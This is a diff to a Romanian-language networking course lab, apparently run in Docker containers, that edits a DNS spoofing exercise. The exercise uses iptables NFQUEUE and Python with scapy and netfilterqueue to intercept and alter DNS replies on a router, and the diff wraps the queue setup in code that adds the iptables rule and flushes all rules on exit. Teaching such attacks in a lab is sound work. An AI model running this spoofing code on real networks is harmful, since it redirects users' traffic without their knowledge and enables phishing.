@@ -1369,8 +1369,10 @@ docker-compose exec router bash
 iptables -I FORWARD -j NFQUEUE --queue-num 10
 ```
 ##### 2. Scriem o funcție care detectează și modifică pachete de tip DNS reply
-Deschidem un terminal de python sau scriem codul într-un fișier pe care îl executăm:
+Deschidem un terminal de python sau executăm `python3 /elocal/capitolul3/src/examples/dns_spoofing.py`:
 ```python
+#!/usr/bin/env python3
+
 from scapy.all import *
 from netfilterqueue import NetfilterQueue as NFQ
 import os
@@ -1412,15 +1414,19 @@ def alter_packet(packet):
     del packet[UDP].chksum
     # return the modified packet
     return packet
-
 ```
 
 ##### 3. Executăm coada Netfilter cu funcția definită anterior
 ```python
 queue = NFQ()
-queue.bind(10, detect_and_alter_packet)
-queue.run()
-queue.unbind()
+try:
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
+    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
+    queue.bind(10, detect_and_alter_packet)
+    queue.run()
+except KeyboardInterrupt:
+    os.system("iptables --flush")
+    queue.unbind()
 ```
 
 
